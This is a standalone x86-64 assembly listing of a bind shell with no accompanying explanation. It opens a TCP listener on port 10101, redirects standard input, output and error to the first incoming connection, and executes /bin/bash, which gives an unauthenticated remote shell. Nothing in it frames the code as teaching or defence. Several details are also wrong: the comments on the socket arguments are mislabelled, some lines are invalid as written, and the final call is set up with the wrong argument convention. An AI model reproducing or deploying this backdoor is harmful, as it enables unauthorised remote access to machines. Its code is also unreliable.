sin:
    .zero 16
sock:
    .zero 4
fd:
    .zero 4
.LC0:
    .string "/bin/bash"
bash:
    .quad   .LC0
main:
    push    rbp
    mov     rbp, rsp

    ; Initialize sin structure
    mov     eax, AF_INET
    mov     WORD PTR sin[rip], ax
    mov     edi, 10101
    call    htons
    mov     WORD PTR sin[rip+2], ax

    ; Create socket
    mov     edx, 6       ; AF_INET
    mov     esi, 1       ; SOCK_STREAM
    mov     edi, 2       ; IPPROTO_TCP
    call    socket
    mov     DWORD PTR sock[rip], eax
    mov     eax, DWORD PTR sock[rip]

    ; Bind socket to address
    mov     edx, 16       ; sizeof(struct sockaddr_in)
    mov     esi, OFFSET FLAT:sin
    mov     edi, eax
    call    bind

    ; Listen for connections
    mov     eax, DWORD PTR sock[rip]
    mov     esi, 1       ; Backlog (number of pending connections)
    mov     edi, eax
    call    listen

    ; Accept a connection
    mov     eax, DWORD PTR sock[rip]
    mov     edx, 0       ; Client address (unused here)
    mov     esi, 0       ; Client address length (unused here)
    mov     edi, eax
    call    accept
    mov     DWORD PTR fd[rip], eax

    ; Duplicate file descriptors for stdin, stdout, and stderr
    mov     eax, DWORD PTR fd[rip]
    mov     esi, 0       ; Standard input (stdin) descriptor
    mov     edi, eax
    call    dup2
    mov     eax, DWORD PTR fd[rip]
    mov     esi, 1       ; Standard output (stdout) descriptor
    mov     edi, eax
    call    dup2
    mov     eax, DWORD PTR fd[rip]
    mov     esi, 2       ; Standard error (stderr) descriptor
    mov     edi, eax
    call    dup2

    ; Execute bash shell
    mov     rcx, QWORD PTR bash[rip]  ; Argument array pointer
    mov     rax, QWORD PTR bash[rip]  ; Program path
    mov     rdx, NULL                 ; envp (environment variables) - NULL for default environment
    mov     rsi, rcx                 ; Argument array pointer
    mov     rdi, rax                 ; Program path
    mov     eax, 0
    call    execlp

    mov     eax, 0
    pop     rbp
    ret

